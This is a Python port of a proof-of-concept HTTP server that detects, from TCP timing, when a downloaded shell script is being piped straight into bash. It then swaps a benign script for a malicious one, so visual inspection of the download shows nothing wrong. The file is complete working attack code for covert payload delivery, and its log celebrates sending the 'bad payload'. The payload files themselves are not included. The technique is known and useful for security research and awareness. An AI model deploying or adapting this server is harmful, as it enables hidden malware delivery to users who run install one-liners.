"""This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.

   A script to detect the use of curl or wget -O - | bash.

   See https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/
   for more details on how this works.

   @author Phil

   Update: Moser <will.moser@spacecoast.dev>
   The original site is down so I've included the code here.
   See https://web.archive.org/web/20250622061208/https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/ for the archived version.

   Ported to Python 3: stdlib-only (no numpy), modern ssl.SSLContext, and
   byte-clean socket I/O.
"""

import email.utils
import re
import socket
import socketserver
import ssl
import statistics
import time


class MoguiServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """HTTP server to detect curl | bash."""

    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, server_address):
        """Accepts a tuple of (HOST, PORT)."""
        self.payloads = {}
        self.ssl_options = None

        # Socket timeout (seconds).
        self.socket_timeout = 10

        # Outbound TCP socket buffer size.
        self.buffer_size = 87380

        # What to fill the TCP buffers with (raw bytes).
        self.padding = bytes(self.buffer_size)

        # Maximum number of blocks of padding - this shouldn't need to be
        # adjusted but may need to be increased if it's not working.
        self.max_padding = 16

        super().__init__(server_address, HTTPHandler)

    def setssl(self, cert_file, key_file):
        """Sets SSL params for the server sockets."""
        self.ssl_options = (cert_file, key_file)

    def status_200(self):
        """Build a fresh chunked-transfer 200 response header (bytes).

        The Date header is generated per request so responses are not stamped
        with the server's start time.
        """
        header = (
            "HTTP/1.1 200 OK\r\n"
            "Server: Apache\r\n"
            "Date: %s\r\n"
            "Content-Type: text/plain; charset=us-ascii\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n\r\n"
        ) % email.utils.formatdate(usegmt=True)
        return header.encode("ascii", errors="ignore")

    def setscript(self, uri, params):
        """Sets parameters for each URI."""
        (null, good, bad, min_jump, max_variance) = params

        # Payloads are sent verbatim over the socket, so read them as bytes.
        with open(null, "rb") as fh:
            null_payload = fh.read()   # Base file with a delay
        with open(good, "rb") as fh:
            good_payload = fh.read()   # Non-malicious payload
        with open(bad, "rb") as fh:
            bad_payload = fh.read()    # Malicious payload

        self.payloads[uri] = (null_payload, good_payload, bad_payload,
                              min_jump, max_variance)


class HTTPHandler(socketserver.BaseRequestHandler):
    """Socket handler for MoguiServer."""

    def sendchunk(self, text):
        """Sends a single HTTP chunk. `text` must be bytes."""
        size = ("%x\r\n" % len(text)).encode("ascii")
        self.request.sendall(size)
        self.request.sendall(text)
        self.request.sendall(b"\r\n")

    def log(self, msg):
        """Writes output to stdout."""
        print("[%s] %s %s" % (time.time(), self.client_address[0], msg))

    def handle(self):
        """Handles inbound TCP connections from MoguiServer.

        If the two packets are transmitted with a time difference of at least
        min_jump and the remaining packets have a variance below max_var, the
        output has been piped through bash.
        """
        self.log("Inbound request")

        # Setup socket options.
        self.request.settimeout(self.server.socket_timeout)
        self.request.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.request.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF,
                                self.server.buffer_size)

        # Attempt to wrap the TCP socket in TLS.
        if self.server.ssl_options:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(certfile=self.server.ssl_options[0],
                                    keyfile=self.server.ssl_options[1])
                self.request = ctx.wrap_socket(self.request, server_side=True)
            except (ssl.SSLError, OSError) as exc:
                self.log("SSL negotiation failed: %s" % exc)
                return

        # Parse the HTTP request.
        try:
            data = self.request.recv(1024)
        except (OSError, socket.timeout):
            self.log("No data received")
            return

        if not data:
            self.log("No data received")
            return

        # latin-1 round-trips every byte value, so header parsing never raises.
        request_text = data.decode("latin-1")

        uri = re.search(r"^GET ([^ ]+) HTTP/1\.[0-9]", request_text)
        if not uri:
            self.log("HTTP request malformed.")
            return

        request_uri = uri.group(1)
        self.log("Request for shell script %s" % request_uri)

        if request_uri not in self.server.payloads:
            self.log("No payload found for %s" % request_uri)
            return

        # Return 200 status code.
        self.request.sendall(self.server.status_200())

        (payload_plain, payload_good, payload_bad,
         min_jump, max_var) = self.server.payloads[request_uri]

        # Send plain payload.
        self.sendchunk(payload_plain)

        if not re.search(r"User-Agent: (curl|Wget)", request_text):
            self.sendchunk(payload_good)
            self.sendchunk(b"")
            self.log("Request not via wget/curl. Returning good payload.")
            return

        timing = []
        stime = time.time()

        for _ in range(self.server.max_padding):
            self.sendchunk(self.server.padding)
            timing.append(time.time() - stime)

        # ReLU curve analysis: the gaps between successive padding flushes.
        max_array = [timing[i + 1] - timing[i] for i in range(len(timing) - 1)]
        if not max_array:
            self.log("Not enough timing samples; sending good payload.")
            self.sendchunk(payload_good)
            self.sendchunk(b"")
            return

        jump = max(max_array)
        del max_array[max_array.index(jump)]

        # Population variance of the remaining gaps (numpy std**2 equivalent).
        var = statistics.pvariance(max_array) if len(max_array) > 1 else 0.0

        self.log("Variance = %s, Maximum Jump = %s" % (var, jump))

        # Payload choice.
        if var < max_var and jump > min_jump:
            self.log("Execution through bash detected - sending bad payload :D")
            self.sendchunk(payload_bad)
        else:
            self.log("Sending good payload :(")
            self.sendchunk(payload_good)

        self.sendchunk(b"")
        self.log("Connection closed.")


if __name__ == "__main__":

    HOST, PORT = "0.0.0.0", 5555

    SERVER = MoguiServer((HOST, PORT))
    SERVER.setscript("/setup.bash", ("ticker.sh", "good.sh", "bad.sh", 2.0, 0.1))
    SERVER.setssl("cert.pem", "key.pem")

    print("Listening on %s %s" % (HOST, PORT))
    SERVER.serve_forever()
